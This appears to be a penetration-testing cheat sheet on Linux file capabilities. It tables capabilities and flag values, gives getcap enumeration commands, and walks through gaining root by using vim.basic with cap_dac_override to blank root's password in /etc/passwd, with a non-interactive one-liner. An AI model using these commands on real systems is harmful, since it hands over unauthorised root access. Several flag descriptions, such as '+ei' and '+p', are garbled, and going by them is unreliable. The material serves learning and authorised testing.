# Special File Capabilities

```text
Capability	Description
cap_sys_admin	Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.
cap_sys_chroot	Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.
cap_sys_ptrace	Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.
cap_sys_nice	Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.
cap_sys_time	Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.
cap_sys_resource	Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.
cap_sys_module	Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.
cap_net_bind_service	Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.

Values	Description
=	This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.
+ep	This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.
+ei	This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.
+p	This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.

Several Linux capabilities can be used to escalate a user's privileges to root, including:

Capability	Description
cap_setuid	Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.
cap_setgid	Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.
cap_sys_admin	This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.
cap_dac_override	Allows bypassing of file read, write, and execute permission checks.
```

```bash
getcap -r / 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

```text
If we gained access to the system with a low-privilege account, then discovered the cap_dac_override capability:
```

```bash
haunter@OPFOR[/attacker]$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
```

```text
For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo. However, because the binary has the cap_dac_override capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the cap_dac_override capability and perform tasks that require this capability.

Let us take a look at the /etc/passwd file where the user root is specified:
```

```bash
haunter@OPFOR[/attacker]$ cat /etc/passwd | head -n1
root:x:0:0:root:/root:/bin/bash
```

```text
We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
```

```bash
haunter@OPFOR[/attacker]$ /usr/bin/vim.basic /etc/passwd
```

```bash
# We also can make these changes in a non-interactive mode:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
